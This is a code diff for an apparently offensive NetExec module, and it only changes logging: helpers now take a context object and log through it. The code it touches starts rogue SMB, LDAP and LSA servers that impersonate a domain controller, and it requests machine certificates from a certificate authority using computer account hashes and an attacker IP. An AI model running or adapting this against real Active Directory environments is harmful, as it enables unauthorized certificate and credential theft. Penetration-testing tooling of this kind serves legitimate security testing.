@@ -28,7 +28,6 @@ from impacket.ldap.ldap import LDAPSessionError
 from impacket.ldap.ldapasn1 import Scope
 
 from nxc.helpers.misc import CATEGORY, gen_random_string
-from nxc.logger import nxc_logger
 from nxc.parsers.ldap_results import parse_result_attributes
 from nxc.paths import NXC_PATH
 
@@ -49,17 +48,17 @@ def dns_to_netbios(domain):
     return domain.split(".")[0].upper()
 
 
-def port_open(host, port, timeout=1.0):
+def port_open(context, host, port, timeout=1.0):
     try:
         sock = socket.create_connection((host, port), timeout)
         sock.close()
         return True
     except OSError as e:
-        nxc_logger.debug(f"Port {host}:{port} not reachable: {e}")
+        context.log.debug(f"Port {host}:{port} not reachable: {e}")
         return False
 
 
-def resolve_hostname(hostname, nameserver):
+def resolve_hostname(context, hostname, nameserver):
     try:
         resolver = dns.resolver.Resolver(configure=False)
         resolver.nameservers = [nameserver]
@@ -67,7 +66,7 @@ def resolve_hostname(hostname, nameserver):
         resolver.lifetime = 5
         return str(resolver.resolve(hostname, "A")[0])
     except Exception as e:
-        nxc_logger.debug(f"DNS resolution failed for {hostname}: {e}")
+        context.log.debug(f"DNS resolution failed for {hostname}: {e}")
         return None
 
 
@@ -279,8 +278,9 @@ class LSASrv(DCERPCServer):
 
     LSA_UUID = ("12345778-1234-ABCD-EF00-0123456789AB", "0.0")
 
-    def __init__(self, netbios_name, dns_name, forest_name, domain_guid, domain_sid):
+    def __init__(self, context, netbios_name, dns_name, forest_name, domain_guid, domain_sid):
         DCERPCServer.__init__(self)
+        self.context = context
         self.handle = b"\x00" * 4 + b"LSA!" + b"\xde\xad\xbe\xef" * 2  # fake policy handle
         self.netbios_name = netbios_name
         self.dns_name = dns_name
@@ -363,7 +363,7 @@ class LSASrv(DCERPCServer):
             query = lsad.LsarQueryInformationPolicy(data)
             info_level = int(query["InformationClass"])
         except Exception as e:
-            nxc_logger.debug(f"LSA query parse failed, defaulting to level 12: {e}")
+            self.context.log.debug(f"LSA query parse failed, defaulting to level 12: {e}")
             info_level = 12  # PolicyDnsDomainInfo
 
         resp = response_class()
@@ -395,7 +395,7 @@ class RogueServerState:
         self.error = None
 
 
-def run_rogue_smb(bind_addr, port, netbios_name, dns_name, forest_name, domain_guid, domain_sid,
+def run_rogue_smb(context, bind_addr, port, netbios_name, dns_name, forest_name, domain_guid, domain_sid,
                   comp_name, comp_hash, comp_pass, comp_domain, dc_ip, state):
     patch_smb_server()
     try:
@@ -409,7 +409,7 @@ def run_rogue_smb(bind_addr, port, netbios_name, dns_name, forest_name, domain_g
         smb_config.set("global", "server_os", "Windows Server 2022 Standard")
         smb.getServer().setServerConfig(smb_config)
         smb.getServer().processConfigFile()
-        lsa = LSASrv(netbios_name, dns_name, forest_name, domain_guid, domain_sid)
+        lsa = LSASrv(context, netbios_name, dns_name, forest_name, domain_guid, domain_sid)
         lsa.daemon = True
         lsa.start()
         # CA follows cdc: redirects LDAP/SMB to us, then queries lsarpc over SMB
@@ -650,7 +650,7 @@ def connect_icpr(binding, ca_ip, domain, comp_name, comp_hash, dc_ip):
     return dce
 
 
-def request_certificate(ca_ip, ca_name, domain, comp_name, comp_hash, dc_ip,
+def request_certificate(context, ca_ip, ca_name, domain, comp_name, comp_hash, dc_ip,
                         attacker_ip, rmd_value, template="Machine"):
     key = rsa_mod.generate_private_key(65537, 2048)
     hostname = f"{comp_name.rstrip('$')}.{domain}"
@@ -666,7 +666,7 @@ def request_certificate(ca_ip, ca_name, domain, comp_name, comp_hash, dc_ip,
         binding = f"ncacn_np:{ca_ip}[\\pipe\\cert]"
         dce = connect_icpr(binding, ca_ip, domain, comp_name, comp_hash, dc_ip)
     except Exception as e:
-        nxc_logger.debug(f"Named pipe transport failed, falling back to TCP: {e}")
+        context.log.debug(f"Named pipe transport failed, falling back to TCP: {e}")
         binding = epm.hept_map(ca_ip, MSRPC_UUID_ICPR, protocol="ncacn_ip_tcp")
         dce = connect_icpr(binding, ca_ip, domain, comp_name, comp_hash, dc_ip)
 
@@ -768,7 +768,7 @@ class NXCModule:
             dns_hostname = entry.get("dNSHostName", "")
             ca_ip = None
             if dns_hostname:
-                ca_ip = resolve_hostname(dns_hostname, connection.host)
+                ca_ip = resolve_hostname(self.context, dns_hostname, connection.host)
             cas.append({"cn": cn, "dNSHostName": dns_hostname, "ip": ca_ip or connection.host})
         return cas
 
@@ -936,7 +936,7 @@ class NXCModule:
             self.context.log.display(f"Requesting certificate (template={self.template}, cdc={self.listener})")
             try:
                 pfx_data = request_certificate(
-                    ca["ip"], ca["cn"], connection.domain, comp.name, comp.hash, connection.host,
+                    self.context, ca["ip"], ca["cn"], connection.domain, comp.name, comp.hash, connection.host,
                     self.listener, dc_info.dns, self.template,
                 )
             except RuntimeError as e:
@@ -955,7 +955,7 @@ class NXCModule:
         smb_state = RogueServerState()
         threading.Thread(
             target=run_rogue_smb, daemon=True,
-            args=("0.0.0.0", 445, dc_info.domain_nb, connection.domain, connection.domain, dc_info.domain_guid,
+            args=(self.context, "0.0.0.0", 445, dc_info.domain_nb, connection.domain, connection.domain, dc_info.domain_guid,
                   dc_info.domain_sid, comp.name, comp.hash, comp.password, connection.domain, connection.host,
                   smb_state),).start()
 
@@ -977,7 +977,7 @@ class NXCModule:
             if ldap_state.error:
                 self.check_bind_capabilities("LDAP", ldap_state.error)
                 return False
-            if port_open("127.0.0.1", 445) and port_open("127.0.0.1", 389):
+            if port_open(self.context, "127.0.0.1", 445) and port_open(self.context, "127.0.0.1", 389):
                 return True
             time.sleep(1)
         self.context.log.fail(f"Rogue servers failed to start within {timeout}s")
